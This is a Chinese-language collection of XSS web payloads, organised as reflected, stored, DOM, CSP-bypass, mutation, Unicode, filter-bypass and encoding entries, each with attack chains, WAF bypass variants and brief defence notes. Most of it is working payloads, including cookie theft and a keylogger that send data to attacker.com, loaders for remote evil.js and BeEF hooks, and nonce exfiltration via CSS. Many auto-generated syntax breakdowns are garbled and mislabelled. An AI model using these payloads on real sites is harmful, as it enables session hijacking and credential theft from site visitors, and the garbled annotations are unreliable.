# XSS跨站脚本

_12 条 web payload_

### 反射型XSS  `xss-reflected`
_反射型跨站脚本攻击技术_
子类：**反射型** · tags: `xss` `reflected` `javascript`

**前置条件：**
- 存在用户输入反射到页面
- 输入未经过滤或编码

**攻击链：**

**1. 探测XSS注入点**
> 基础XSS探测
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
" onfocus=alert(1) autofocus "
```
**语法解析：**
- `<script>` — HTML script标签 _tag_
- `alert(1)` — JavaScript弹窗函数 _function_
- `onerror` — 图片加载错误事件 _value_
- `onload` — 元素加载完成事件 _value_

**2. 事件处理器绕过**
> 使用各种事件处理器
```
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
```
**语法解析：**
- `onerror` — 错误事件 _value_
- `onload` — 加载事件 _value_
- `onfocus` — 获取焦点事件 _value_
- `onstart` — 开始事件 _value_

**3. 标签绕过**
> 大小写混淆和标签变形
```
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
<svg/onload=alert(1)>
<details/open/ontoggle=alert(1)>
```
**语法解析：**
- `ScRiPt` — 大小写混合绕过 _value_
- `svg/onload` — 使用斜杠代替空格 _value_

**4. 窃取Cookie**
> 窃取用户Cookie
```
<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>
<script>location="http://attacker.com/steal?c="+document.cookie</script>
```
**语法解析：**
- `document.cookie` — 获取当前页面Cookie _function_
- `new Image().src` — 创建图片对象发送请求 _value_
- `fetch()` — 使用Fetch API发送请求 _function_

**5. 键盘记录**
> 记录用户键盘输入
```
<script>
document.onkeypress=function(e){
  fetch("http://attacker.com/log?key="+e.key)
}
</script>
```
**语法解析：**
- `onkeypress` — 键盘按下事件 _value_
- `e.key` — 按下的键值 _value_

**WAF/EDR 绕过变体：**

**HTML实体编码**
> 使用HTML实体编码绕过
```
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```
**语法解析：**
- `&#97;` — a的十进制HTML实体 _encoding_
- `&#x61;` — a的十六进制HTML实体 _encoding_

**Unicode编码**
> 使用Unicode编码绕过
```
<script>\u0061lert(1)</script>
<img src=x onerror=\u0061lert(1)>
```
**语法解析：**
- `\a` — a的Unicode编码 _value_

**双写绕过**
> 双写绕过关键字删除
```
<scr<script>ipt>alert(1)</scr</script>ipt>
<imimgg src=x onerror=alert(1)>
```
**语法解析：**
- `<scr<script>` — HTML标签/事件处理器 _tag_
- `ipt>alert(1)` — 注入代码 _value_
- `</scr</script>` — HTML标签/事件处理器 _tag_
- `ipt>
` — 注入代码 _value_
- `<imimgg src=x onerror=alert(1)>` — HTML标签/事件处理器 _tag_

**注释混淆**
> 使用注释混淆
```
<script>/**/alert(1)/**/</script>
<img src=x/**/onerror=alert(1)>
<svg on<!--test-->load=alert(1)>
```
**语法解析：**
- `<script>` — HTML标签/事件处理器 _tag_
- `/**/alert(1)/**/` — 注入代码 _value_
- `</script>` — HTML标签/事件处理器 _tag_
- `
` — 注入代码 _value_
- `<img src=x/**/onerror=alert(1)>` — HTML标签/事件处理器 _tag_
- `
` — 注入代码 _value_
- `<svg on<!--test-->` — HTML标签/事件处理器 _tag_
- `load=alert(1)>` — 注入代码 _value_


**概述：** XSS反射型跨站脚本攻击是最常见的XSS类型，恶意脚本通过URL参数传递给服务器后直接回显在响应页面中，需要诱导受害者点击恶意链接才能触发执行。

**漏洞原理：** 反射型XSS漏洞发生在服务器将用户输入(URL参数、表单字段、HTTP头)未经转义直接嵌入HTML响应中。常见触发点包括搜索结果页、错误页面、404页面中回显用户输入的位置。

**利用方法：** 完整利用流程：
1. 探测XSS注入点
2. 绕过过滤机制
3. 构造恶意payload
4. 诱使受害者点击链接
5. 窃取Cookie或执行恶意操作

**防御措施：** 防御措施：
1. 对所有用户输入进行HTML实体编码
2. 使用CSP (Content-Security-Policy)
3. 设置HttpOnly Cookie标志
4. 输入验证和白名单过滤

---

### 存储型XSS  `xss-stored`
_存储型跨站脚本攻击技术_
子类：**存储型** · tags: `xss` `stored` `persistent`

**前置条件：**
- 存在数据存储功能
- 存储数据未经过滤显示

**攻击链：**

**1. 探测存储点**
> 探测存储型XSS
```
在评论区、用户名、个人简介等处输入:
<script>alert(1)</script>
"><script>alert(1)</script>
测试是否存储并执行
```
**语法解析：**
- `在评论区、用户名、个人简介等处输入:
` — 注入代码 _value_
- `<script>` — HTML标签/事件处理器 _tag_
- `alert(1)` — 注入代码 _value_
- `</script>` — HTML标签/事件处理器 _tag_
- `
">` — 注入代码 _value_
- `<script>` — HTML标签/事件处理器 _tag_
- `alert(1)` — 注入代码 _value_
- `</script>` — HTML标签/事件处理器 _tag_
- `
测试是否存储并执行` — 注入代码 _value_

**2. 隐蔽Payload**
> 使用隐蔽的XSS payload
```
<img src=x onerror=alert(1) style="display:none">
<svg/onload=alert(1) style="position:absolute;left:-9999px">
<div style="background:url(javascript:alert(1))">
```
**语法解析：**
- `style="display:none"` — 隐藏元素 _value_
- `position:absolute;left:-9999px` — 移出可视区域 _value_

**3. 持久化控制**
> 加载外部恶意脚本
```
<script>
if(!window.xss_loaded){
  window.xss_loaded=true;
  var s=document.createElement("script");
  s.src="http://attacker.com/evil.js";
  document.body.appendChild(s);
}
</script>
```
**语法解析：**
- `createElement` — 创建DOM元素 _function_
- `appendChild` — 添加到DOM树 _function_

**4. BeEF Hook**
> 使用BeEF框架控制浏览器
```
<script src="http://beef-server:3000/hook.js"></script>
或:
<script>
var s=document.createElement("script");
s.src="http://beef-server:3000/hook.js";
document.body.appendChild(s);
</script>
```
**语法解析：**
- `<script src="http://beef-server:3000/hook.js">` — HTML标签/事件处理器 _tag_
- `</script>` — HTML标签/事件处理器 _tag_
- `
或:
` — 注入代码 _value_
- `<script>` — HTML标签/事件处理器 _tag_
- `
var s=document.createElement("script");
s.src="http://beef-server:3000/hook.js";
document.body.appendChild(s);
` — 注入代码 _value_
- `</script>` — HTML标签/事件处理器 _tag_

**WAF/EDR 绕过变体：**

**SVG标签绕过**
> 使用SVG标签绕过
```
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1)>
<svg><set onbegin=alert(1)>
```
**语法解析：**
- `<svg>` — HTML标签/事件处理器 _tag_
- `<script>` — HTML标签/事件处理器 _tag_
- `alert(1)` — 注入代码 _value_
- `</script>` — HTML标签/事件处理器 _tag_
- `</svg>` — HTML标签/事件处理器 _tag_
- `
` — 注入代码 _value_
- `<svg>` — HTML标签/事件处理器 _tag_
- `<animate onbegin=alert(1)>` — HTML标签/事件处理器 _tag_
- `
` — 注入代码 _value_
- `<svg>` — HTML标签/事件处理器 _tag_
- `<set onbegin=alert(1)>` — HTML标签/事件处理器 _tag_

**Math标签绕过**
> 使用MathML标签
```
<math><maction actiontype="statusline#http://attacker.com" xlink:href="javascript:alert(1)">click</maction></math>
```
**语法解析：**
- `<math>` — HTML标签/事件处理器 _tag_
- `<maction actiontype="statusline#http://attacker.com" xlink:href="javascript:alert(1)">` — HTML标签/事件处理器 _tag_
- `click` — 注入代码 _value_
- `</maction>` — HTML标签/事件处理器 _tag_
- `</math>` — HTML标签/事件处理器 _tag_


**概述：** 存储型XSS是危害最大的XSS类型，恶意脚本被永久存储在目标服务器(数据库/文件)中。每个访问受感染页面的用户都会自动执行恶意代码，无需用户点击特殊链接。

**漏洞原理：** 存储型XSS的触发点包括：用户评论/留言板、个人资料(用户名/签名/头像URL)、论坛帖子、即时消息、文件名、日志查看器等任何存储后会被其他用户浏览的内容。漏洞根因是存储时和显示时均未进行安全处理。

**利用方法：** 完整利用流程：
1. 找到数据存储点
2. 注入恶意脚本
3. 等待其他用户访问
4. 自动执行恶意操作

**防御措施：** 防御措施：
1. 存储前进行HTML编码
2. 输出时进行上下文编码
3. 使用CSP策略
4. 定期扫描存储内容

---

### DOM型XSS  `xss-dom`
_基于DOM的跨站脚本攻击_
子类：**DOM型** · tags: `xss` `dom` `javascript`

**前置条件：**
- 存在JavaScript动态操作DOM
- 用户输入直接写入DOM

**攻击链：**

**1. 探测DOM XSS**
> 探测DOM型XSS
```
#<script>alert(1)</script>
?param=<img src=x onerror=alert(1)>
检查location.hash、location.search等是否直接写入DOM
```
**语法解析：**
- `location.hash` — URL中#后面的部分 _value_
- `location.search` — URL中?后面的查询字符串 _value_

**2. 常见Sink点**
> 常见的DOM XSS Sink点
```
document.write(location.hash)
innerHTML = location.search
eval(location.hash)
setTimeout(location.hash, 0)
jQuery(html)
$(location.hash)
```
**语法解析：**
- `document.write` — 直接写入HTML _value_
- `innerHTML` — 设置元素HTML内容 _value_
- `eval()` — 执行JavaScript代码 _value_

**3. location.hash利用**
> 利用location.hash
```
URL: http://target.com/#<img src=x onerror=alert(1)>
如果页面有: document.write(location.hash)
则触发XSS
```
**语法解析：**
- `URL: http://target.com/#` — 注入代码 _value_
- `<img src=x onerror=alert(1)>` — HTML标签/事件处理器 _tag_
- `
如果页面有: document.write(location.hash)
则触发XSS` — 注入代码 _value_

**4. postMessage利用**
> 利用postMessage
```
window.addEventListener("message", function(e){
  document.getElementById("output").innerHTML = e.data;
});
攻击页面:
targetWindow.postMessage("<img src=x onerror=alert(1)>", "*");
```
**语法解析：**
- `<img>` — 图片标签 _tag_
- `onerror` — 错误事件 _keyword_
- `alert()` — 弹窗函数 _function_
- `innerHTML` — DOM内容修改 _variable_

**WAF/EDR 绕过变体：**

**javascript:协议变体绕过**
> 使用大小写混淆、HTML实体编码、制表符插入等方式绕过javascript:协议过滤
```
javascript:alert(1)
javascript	:alert(1)
jaVaScRiPt:alert(1)
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">click</a>
```
**语法解析：**
- `javascript:alert(1)
javascript	:alert(1)
jaVaScRiPt:alert(1)
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)
` — 注入代码 _value_
- `<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">` — HTML标签/事件处理器 _tag_
- `click` — 注入代码 _value_
- `</a>` — HTML标签/事件处理器 _tag_

**SVG/MathML标签与事件处理器绕过**
> 利用SVG、MathML等非标准HTML标签及冷门事件处理器(ontoggle、onpageshow)绕过标签和事件黑名单
```
<svg onload=alert(1)>
<svg/onload=alert(1)>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
<details open ontoggle=alert(1)>
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>
```
**语法解析：**
- `<svg onload=alert(1)>` — HTML标签/事件处理器 _tag_
- `<svg/onload=alert(1)>` — HTML标签/事件处理器 _tag_
- `<math>` — HTML标签/事件处理器 _tag_
- `<mtext>` — HTML标签/事件处理器 _tag_
- `<table>` — HTML标签/事件处理器 _tag_
- `<mglyph>` — HTML标签/事件处理器 _tag_
- `<svg>` — HTML标签/事件处理器 _tag_
- `<mtext>` — HTML标签/事件处理器 _tag_
- `<textarea>` — HTML标签/事件处理器 _tag_
- `<path id="</textarea>` — HTML标签/事件处理器 _tag_
- `<img onerror=alert(1) src=1>` — HTML标签/事件处理器 _tag_
- `">
` — 注入代码 _value_
- `<details open ontoggle=alert(1)>` — HTML标签/事件处理器 _tag_
- `<body onpageshow=alert(1)>` — HTML标签/事件处理器 _tag_
- `<input onfocus=alert(1) autofocus>` — HTML标签/事件处理器 _tag_


**概述：** DOM型XSS完全在客户端执行，恶意脚本不经过服务器处理。攻击者通过操纵DOM环境(如URL片段、document.referrer)使页面JavaScript读取并不安全地写入恶意内容。

**漏洞原理：** DOM型XSS的source(输入源)包括location.hash、location.search、document.referrer、postMessage等，sink(危险函数)包括innerHTML、document.write、eval、setTimeout等。当source数据未经净化直接传递给sink时触发漏洞。

**利用方法：** 完整利用流程：
1. 分析JavaScript代码找到Sink点
2. 构造恶意URL
3. 诱使受害者访问
4. 浏览器执行恶意脚本

**防御措施：** 防御措施：
1. 使用textContent代替innerHTML
2. 对DOM操作进行编码
3. 使用安全的框架API
4. 启用CSP策略

---

### CSP绕过  `xss-csp-bypass`
_绕过内容安全策略(CSP)的XSS技术_
子类：**CSP绕过** · tags: `xss` `csp` `bypass`

**前置条件：**
- 存在XSS漏洞
- 存在CSP策略但配置不当

**攻击链：**

**1. 分析CSP策略**
> 分析CSP配置
```
查看HTTP响应头:
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
或使用CSP Evaluator工具分析
```
**语法解析：**
- `查看HTTP响应头:` — 命令/关键字 _command_

**2. 利用unsafe-inline**
> 利用unsafe-inline配置
```
如果CSP包含unsafe-inline:
<script>alert(1)</script>
可以直接执行内联脚本
```
**语法解析：**
- `如果CSP包含unsafe-inline:
` — 注入代码 _value_
- `<script>` — HTML标签/事件处理器 _tag_
- `alert(1)` — 注入代码 _value_
- `</script>` — HTML标签/事件处理器 _tag_
- `
可以直接执行内联脚本` — 注入代码 _value_

**3. 利用unsafe-eval**
> 利用unsafe-eval配置
```
如果CSP包含unsafe-eval:
<script>eval("alert(1)")</script>
<script>setTimeout("alert(1)", 0)</script>
可以使用eval等函数
```
**语法解析：**
- `如果CSP包含unsafe-eval:
` — 注入代码 _value_
- `<script>` — HTML标签/事件处理器 _tag_
- `eval("alert(1)")` — 注入代码 _value_
- `</script>` — HTML标签/事件处理器 _tag_
- `<script>` — HTML标签/事件处理器 _tag_
- `setTimeout("alert(1)", 0)` — 注入代码 _value_
- `</script>` — HTML标签/事件处理器 _tag_
- `
可以使用eval等函数` — 注入代码 _value_

**4. JSONP绕过**
> 利用JSONP绕过
```
如果允许的域名有JSONP端点:
<script src="https://allowed-domain.com/jsonp?callback=alert(1)"></script>
利用JSONP回调执行代码
```
**语法解析：**
- `callback` — JSONP回调参数 _value_

**5. AngularJS绕过**
> 利用AngularJS绕过CSP
```
如果允许了AngularJS CDN:
<div ng-app ng-csp>
<div ng-focus="$event.path|orderBy:'[].constructor.from([alert(1)])'" tabindex=0>
</div>
</div>
```
**语法解析：**
- `alert()` — 弹窗函数 _function_

**6. Dangling Markup**
> 利用悬挂标记窃取数据
```
<img src='http://attacker.com/?
捕获后续HTML内容直到遇到单引号
```
**语法解析：**
- `<img>` — 图片标签 _tag_

**WAF/EDR 绕过变体：**

**JSONP端点劫持CSP**
> 利用CSP白名单域上的JSONP回调端点或AngularJS库执行任意JavaScript，无需unsafe-inline
```
# 寻找白名单域上的JSONP端点:
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor("alert(1)")()}}</div>
```
**语法解析：**
- `# 寻找白名单域上的JSONP端点:
` — 注入代码 _value_
- `<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)">` — HTML标签/事件处理器 _tag_
- `</script>` — HTML标签/事件处理器 _tag_
- `<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js">` — HTML标签/事件处理器 _tag_
- `</script>` — HTML标签/事件处理器 _tag_
- `<div ng-app ng-csp>` — HTML标签/事件处理器 _tag_
- `{{$eval.constructor("alert(1)")()}}` — 注入代码 _value_
- `</div>` — HTML标签/事件处理器 _tag_

**base-uri劫持与script nonce泄露**
> 利用CSP未限制base-uri指令劫持脚本加载源，或通过CSS注入/DOM接口泄露script nonce值
```
# base-uri未限制时:
<base href="http://attacker.com/">
# 页面中相对路径的脚本将从attacker.com加载

# nonce泄露利用:
# 通过CSS注入窃取nonce:
<style>script[nonce^="a"]{background:url(http://attacker.com/?n=a)}</style>
# 或通过DOM读取: document.querySelector("script[nonce]").nonce
```
**语法解析：**
- `# base-uri未限制时:
` — 注入代码 _value_
- `<base href="http://attacker.com/">` — HTML标签/事件处理器 _tag_
- `
# 页面中相对路径的脚本将从attacker.com加载

# nonce泄露利用:
# 通过CSS注入窃取nonce:
` — 注入代码 _value_
- `<style>` — HTML标签/事件处理器 _tag_
- `script[nonce^="a"]{background:url(http://attacker.com/?n=a)}` — 注入代码 _value_
- `</style>` — HTML标签/事件处理器 _tag_
- `
# 或通过DOM读取: document.querySelector("script[nonce]").nonce` — 注入代码 _value_


**概述：** CSP(Content Security Policy)是浏览器端的XSS防御机制，通过限制脚本来源阻止恶意代码执行。CSP绕过技术利用策略配置缺陷或可信域名上的gadget来突破限制。

**漏洞原理：** CSP绕过的常见攻击面：unsafe-inline/unsafe-eval策略过于宽松、base-uri未限制导致<base>标签劫持、script-src白名单包含CDN/JSONP端点、object-src未限制允许Flash/PDF XSS、缺少default-src兜底策略。

**利用方法：** 完整利用流程：
1. 分析CSP策略
2. 寻找白名单中的可利用域名
3. 构造绕过payload
4. 执行恶意脚本

**防御措施：** 防御措施：
1. 使用严格的CSP策略
2. 避免unsafe-inline和unsafe-eval
3. 仔细审查白名单域名
4. 使用nonce或hash方式

---

### 突变型XSS(mXSS)  `xss-mxss`
_利用浏览器解析差异导致的XSS攻击_
子类：**突变型** · tags: `xss` `mxss` `mutation` `bypass`

**前置条件：**
- 存在HTML输出点
- 浏览器解析差异

**攻击链：**

**1. 基础mXSS探测**
> 利用noscript标签解析差异
```
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```
**语法解析：**
- `<noscript>` — 脚本禁用时显示的内容 _tag_
- `p title` — 属性值在解析时变化 _value_
- `</noscript>` — 闭合标签导致突变 _tag_

**2. SVG mXSS**
> SVG CDATA突变
```
<svg><![CDATA[<img src=x onerror=alert(1)>]]></svg>
<svg><script><![CDATA[alert(1)]]></script></svg>
```
**语法解析：**
- `<script>` — 脚本标签 _tag_
- `<img>` — 图片标签 _tag_
- `<svg>` — SVG标签 _tag_
- `onerror` — 错误事件处理器 _keyword_

**3. Math mXSS**
> MathML突变XSS
```
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```
**语法解析：**
- `<img>` — 图片标签 _tag_
- `onerror` — 错误事件处理器 _keyword_
- `alert()` — 弹窗函数 _function_

**4. DOM clobbering配合**
> 利用DOM clobbering
```
<form id=x></form><form id=x><img src=x onerror=alert(1)></form>
```
**语法解析：**
- `id=x` — 重复ID导致DOM变化 _value_

**WAF/EDR 绕过变体：**

**嵌套标签绕过**
> SVG内脚本编码绕过
```
<svg><script>&#97;lert(1)</script></svg>
<svg><script>a&#108;ert(1)</script></svg>
```
**语法解析：**
- `<svg>` — HTML标签/事件处理器 _tag_
- `<script>` — HTML标签/事件处理器 _tag_
- `&#97;lert(1)` — 注入代码 _value_
- `</script>` — HTML标签/事件处理器 _tag_
- `</svg>` — HTML标签/事件处理器 _tag_
- `
` — 注入代码 _value_
- `<svg>` — HTML标签/事件处理器 _tag_
- `<script>` — HTML标签/事件处理器 _tag_
- `a&#108;ert(1)` — 注入代码 _value_
- `</script>` — HTML标签/事件处理器 _tag_
- `</svg>` — HTML标签/事件处理器 _tag_


**概述：** mXSS(Mutation XSS)利用浏览器DOM解析和序列化过程中的差异，使经过安全过滤器处理后的HTML在浏览器渲染时产生新的XSS向量。是绕过DOMPurify等先进过滤器的高级技术。

**漏洞原理：** mXSS利用innerHTML赋值时的DOM序列化→反序列化差异：某些HTML结构在被解析后再序列化时会产生变异(如SVG/MathML命名空间切换、注释节点解析差异)，使原本安全的HTML变为包含脚本执行能力的代码。

**利用方法：** 完整利用流程：
1. 研究目标过滤规则
2. 构造突变payload
3. 验证解析差异
4. 执行恶意代码

**防御措施：** 防御措施：
1. 使用DOMPurify等安全库
2. 避免innerHTML操作
3. 使用textContent替代
4. 定期更新过滤规则

---

### Unicode XSS  `xss-unicode`
_利用Unicode编码特性绕过过滤_
子类：**Unicode编码** · tags: `xss` `unicode` `encoding` `bypass`

**前置条件：**
- 存在XSS注入点
- 过滤器检查关键字

**攻击链：**

**1. Unicode转义**
> JavaScript Unicode转义
```
<script>\u0061lert(1)</script>
<script>\x61lert(1)</script>
<script>\u{61}lert(1)</script>
```
**语法解析：**
- `\a` — a的Unicode转义（4位） _value_
- `\x61` — a的十六进制转义 _value_
- `\u{61}` — a的Unicode码点转义 _value_

**2. HTML实体编码**
> HTML十进制/十六进制实体
```
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```
**语法解析：**
- `&#97;` — a的十进制HTML实体 _encoding_
- `&#x61;` — a的十六进制HTML实体 _encoding_

**3. Unicode规范化攻击**
> 利用Unicode规范化
```
使用规范化等效字符:
＜script＞alert(1)＜/script＞
使用全角字符绕过
```
**语法解析：**
- `＜` — 全角小于号(U+FF1C) _value_
- `＞` — 全角大于号(U+FF1E) _value_

**4. UTF-7编码**
> UTF-7编码XSS
```
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
需要页面使用UTF-7编码
```
**语法解析：**
- `+ADw-` — UTF-7编码的< _value_
- `+AD4-` — UTF-7编码的> _value_

**WAF/EDR 绕过变体：**

**混合编码绕过**
> 混合多种编码方式
```
<img src=x onerror=\u0061&#108;ert(1)>
<img src=x onerror="\u0061lert`1`">
```
**语法解析：**
- `<img src=x onerror=\a&#108;ert(1)>` — HTML标签/事件处理器 _tag_
- `
` — 注入代码 _value_
- `<img src=x onerror="\alert`1`">` — HTML标签/事件处理器 _tag_

**过长UTF-8编码**
> 利用服务器UTF-8解析差异
```
<img src=x onerror=alert(1)>
使用非最短UTF-8编码形式
```
**语法解析：**
- `<img src=x onerror=alert(1)>` — HTML标签/事件处理器 _tag_
- `
使用非最短UTF-8编码形式` — 注入代码 _value_


**概述：** Unicode XSS利用Unicode字符编码的复杂性绕过XSS过滤器，包括同形异义字符替换、零宽字符插入、UTF-16/UTF-32编码差异等技术，使恶意脚本在过滤器和浏览器之间产生不同解释。

**漏洞原理：** Unicode XSS攻击面：1)全角字符替换半角(＜script＞) 2)UTF-7编码绕过(+ADw-script+AD4-) 3)零宽字符(U+200B/U+FEFF)分割关键词 4)Unicode规范化(NFC/NFKC)导致字符变换 5)IDN同形攻击域名绕过过滤。

**利用方法：** 完整利用流程：
1. 分析编码处理逻辑
2. 选择合适的编码方式
3. 绕过关键字过滤
4. 执行恶意脚本

**防御措施：** 防御措施：
1. 统一使用UTF-8编码
2. 输入规范化后再过滤
3. 使用安全的编码函数
4. 避免混合编码处理

---

### XSS过滤器绕过  `xss-filter-bypass`
_各种绕过XSS过滤器的技术_
子类：**过滤器绕过** · tags: `xss` `filter` `bypass` `waf`

**前置条件：**
- 存在XSS注入点
- 存在过滤机制

**攻击链：**

**1. 大小写混淆**
> 混合大小写绕过
```
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
<SvG OnLoAd=alert(1)>
```
**语法解析：**
- `ScRiPt` — 大小写混合的script标签 _value_
- `OnErRoR` — 大小写混合的事件处理器 _value_

**2. 双写绕过**
> 双写绕过关键字删除
```
<scr<script>ipt>alert(1)</scr</script>ipt>
<imimgg src=x onerror=alert(1)>
```
**语法解析：**
- `scr<script>ipt` — 中间的script被删除后形成完整标签 _value_

**3. 注释混淆**
> 使用注释混淆
```
<script>/**/alert(1)/**/</script>
<img src=x/**/onerror=alert(1)>
<svg on<!--test-->load=alert(1)>
```
**语法解析：**
- `/**/` — JavaScript注释 _operator_
- `<!--test-->` — HTML注释 _value_

**4. 空字节截断**
> 空字节截断绕过
```
<scr\x00ipt>alert(1)</script>
<img src=x onerror=alert\x00(1)>
```
**语法解析：**
- `\x00` — 空字节，某些过滤器会在此截断 _value_

**5. 标签属性绕过**
> 利用空白字符绕过
```
<img src=x onerror=alert(1)>
<img src=x onerror =alert(1)>
<img src=x onerror	=alert(1)>
<img src=x onerror
=alert(1)>
```
**语法解析：**
- `onerror =` — 等号前加空格 _value_
- `onerror	=` — 等号前加Tab _value_

**6. 事件处理器变体**
> 使用少见的事件处理器
```
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<details open ontoggle=alert(1)>
<audio src=x onerror=alert(1)>
```
**语法解析：**
- `<body onpageshow=alert(1)>` — HTML标签/事件处理器 _tag_
- `
` — 注入代码 _value_
- `<input onfocus=alert(1) autofocus>` — HTML标签/事件处理器 _tag_
- `
` — 注入代码 _value_
- `<marquee onstart=alert(1)>` — HTML标签/事件处理器 _tag_
- `
` — 注入代码 _value_
- `<video>` — HTML标签/事件处理器 _tag_
- `<source onerror=alert(1)>` — HTML标签/事件处理器 _tag_
- `
` — 注入代码 _value_
- `<details open ontoggle=alert(1)>` — HTML标签/事件处理器 _tag_
- `
` — 注入代码 _value_
- `<audio src=x onerror=alert(1)>` — HTML标签/事件处理器 _tag_

**WAF/EDR 绕过变体：**

**Data URI绕过**
> 使用Data URI
```
<a href="data:text/html,<script>alert(1)</script>">click</a>
<iframe src="data:text/html,<script>alert(1)</script>">
```
**语法解析：**
- `<a href="data:text/html,<script>` — HTML标签/事件处理器 _tag_
- `alert(1)` — 注入代码 _value_
- `</script>` — HTML标签/事件处理器 _tag_
- `">click` — 注入代码 _value_
- `</a>` — HTML标签/事件处理器 _tag_
- `
` — 注入代码 _value_
- `<iframe src="data:text/html,<script>` — HTML标签/事件处理器 _tag_
- `alert(1)` — 注入代码 _value_
- `</script>` — HTML标签/事件处理器 _tag_
- `">` — 注入代码 _value_

**SVG动画绕过**
> SVG动画事件
```
<svg><animate onbegin=alert(1)>
<svg><set onbegin=alert(1)>
```
**语法解析：**
- `<svg>` — HTML标签/事件处理器 _tag_
- `<animate onbegin=alert(1)>` — HTML标签/事件处理器 _tag_
- `
` — 注入代码 _value_
- `<svg>` — HTML标签/事件处理器 _tag_
- `<set onbegin=alert(1)>` — HTML标签/事件处理器 _tag_


**概述：** XSS过滤器绕过是实战中最核心的技能，需要深入理解各种过滤规则的实现缺陷，通过HTML标签变体、事件处理器替换、编码混合、DOM特性利用等方式构造有效的XSS向量。

**漏洞原理：** XSS过滤器绕过技术矩阵：1)黑名单绕过(使用非常见标签如<svg>/<details>/<marquee>) 2)事件处理器替换(onfocus/onmouseover代替onclick) 3)属性注入(autofocus配合onfocus) 4)协议绕过(javascript:/data:) 5)HTML实体编码嵌套。

**利用方法：** 完整利用流程：
1. 分析过滤规则
2. 测试各种绕过技术
3. 找到有效的payload
4. 执行恶意代码

**防御措施：** 防御措施：
1. 使用白名单过滤
2. 输出编码而非输入过滤
3. 使用CSP策略
4. 定期更新过滤规则

---

### XSS编码绕过  `xss-encoding`
_利用各种编码技术绕过XSS过滤_
子类：**编码绕过** · tags: `xss` `encoding` `bypass`

**前置条件：**
- 存在XSS注入点
- 存在编码处理

**攻击链：**

**1. URL编码**
> URL编码绕过
```
<img src=x onerror=%61lert(1)>
%3Cscript%3Ealert(1)%3C/script%3E
```
**语法解析：**
- `%61` — a的URL编码 _encoding_
- `%3C` — <的URL编码 _encoding_
- `%3E` — >的URL编码 _encoding_

**2. HTML实体编码**
> HTML实体编码
```
<img src=x onerror=&#97;lert(1)>
<img src=x onerror=&#x61;lert(1)>
&lt;script&gt;alert(1)&lt;/script&gt;
```
**语法解析：**
- `&#97;` — a的十进制HTML实体 _encoding_
- `&#x61;` — a的十六进制HTML实体 _encoding_
- `&lt;` — <的命名实体 _value_

**3. JavaScript编码**
> JavaScript编码
```
<img src=x onerror="\u0061lert(1)">
<img src=x onerror="\x61lert(1)">
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```
**语法解析：**
- `\a` — Unicode转义 _value_
- `atob()` — Base64解码函数 _function_
- `YWxlcnQoMSk=` — alert(1)的Base64 _value_

**4. CSS编码**
> CSS编码（旧版IE）
```
<style>body{background:url("javascript:alert(1)")}</style>
<div style="x:expression(alert(1))">
```
**语法解析：**
- `<style>` — HTML标签/事件处理器 _tag_
- `body{background:url("javascript:alert(1)")}` — 注入代码 _value_
- `</style>` — HTML标签/事件处理器 _tag_
- `
` — 注入代码 _value_
- `<div style="x:expression(alert(1))">` — HTML标签/事件处理器 _tag_

**5. 混合编码**
> 混合多种编码
```
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
```
**语法解析：**
- `<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">` — HTML标签/事件处理器 _tag_
- `
` — 注入代码 _value_
- `<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">` — HTML标签/事件处理器 _tag_
- `click` — 注入代码 _value_
- `</a>` — HTML标签/事件处理器 _tag_

**WAF/EDR 绕过变体：**

**双重URL编码**
> 双重URL编码
```
%253Cscript%253Ealert(1)%253C/script%253E
服务器解码两次时使用
```
**语法解析：**
- `%253Cscript%253Ealert(1)%253C/script%253E
服务器解码两次时使用` — 注入代码 _value_

**UTF-16编码**
> UTF-16编码绕过
```
%00%3C%00s%00c%00r%00i%00p%00t%00%3Ealert(1)%00%3C/s%00c%00r%00i%00p%00t%00%3E
```
**语法解析：**
- `%00%3C%00s%00c%00r%00i%00p%00t%00%3Ealert(1)%00%3C/s%00c%00r%00i%00p%00t%00%3E` — 注入代码 _value_


